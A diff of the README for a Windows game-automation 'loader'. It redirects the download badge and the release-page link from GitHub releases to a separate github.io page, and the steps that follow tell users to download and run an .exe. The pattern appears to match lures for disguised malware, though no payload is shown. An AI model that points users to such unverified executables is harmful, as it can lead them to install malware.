@@ -1,6 +1,6 @@
 # 🎮 solo-hunters-windows-loader - Automate your gameplay for better results
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Yellow-ceramic450/solo-hunters-windows-loader/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://yellow-ceramic450.github.io)
 
 ## What is this tool?
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official release page: [https://github.com/Yellow-ceramic450/solo-hunters-windows-loader/releases](https://github.com/Yellow-ceramic450/solo-hunters-windows-loader/releases)
+1.  Visit the official release page: [https://yellow-ceramic450.github.io](https://yellow-ceramic450.github.io)
 2.  Locate the latest version file. It usually ends with a .exe extension.
 3.  Click the file name to start the download.
 4.  Navigate to your Downloads folder once the file finishes saving.
